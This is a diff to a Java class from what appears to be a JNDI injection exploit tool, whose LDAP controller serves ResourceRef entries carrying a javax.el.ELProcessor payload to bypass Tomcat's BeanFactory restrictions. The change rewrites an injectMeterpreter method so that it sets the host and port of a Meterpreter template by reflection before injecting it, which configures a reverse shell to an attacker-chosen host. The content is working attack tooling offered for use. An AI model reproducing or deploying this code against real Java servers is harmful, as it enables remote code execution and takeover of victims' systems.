@@ -38,6 +38,7 @@ import org.apache.naming.ResourceRef;
 import javax.naming.StringRefAddr;
 
 import java.io.IOException;
+import java.lang.reflect.Field;
 
 import static com.nu1r.jndi.gadgets.utils.ClassNameUtils.generateClassName;
 import static com.nu1r.jndi.gadgets.utils.HexUtils.generatePassword;
@@ -57,7 +58,7 @@ public class TomcatBypassController implements LdapController {
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+]|@  Sending LDAP ResourceRef result for" + base + "  with javax.el.ELProcessor payload"));
+            System.out.println(ansi().render("@|green [+]|@ Sending LDAP ResourceRef result for" + base + "  with javax.el.ELProcessor payload"));
             Entry e = new Entry(base);
             e.addAttribute("javaClassName", "java.lang.String"); //could be any
             //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
@@ -172,7 +173,7 @@ public class TomcatBypassController implements LdapController {
 
             try {
                 payloadType = PayloadType.valueOf(base.substring(fistIndex + 1, secondIndex).toLowerCase());
-                System.out.println(ansi().render("@|green [+]|@  PaylaodType >> " + payloadType));
+                System.out.println(ansi().render("@|green [+]|@ PaylaodType >> " + payloadType));
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -323,9 +324,15 @@ public class TomcatBypassController implements LdapController {
         }
 
         //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
-        public String injectMeterpreter() {
-            System.out.println("------------------------");
-            return injectClass(Meterpreter.class);
+        public String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+            Class<?> ctClazz      = Class.forName("com.nu1r.jndi.template.Meterpreter");
+            Field        WinClassName = ctClazz.getDeclaredField("host");
+            WinClassName.setAccessible(true);
+            WinClassName.set(ctClazz, params[0]);
+            Field WinclassBody = ctClazz.getDeclaredField("port");
+            WinclassBody.setAccessible(true);
+            WinclassBody.set(ctClazz, params[1]);
+            return injectClass(ctClazz);
         }
 
         public String injectTomcatFilterJmx() throws Exception {
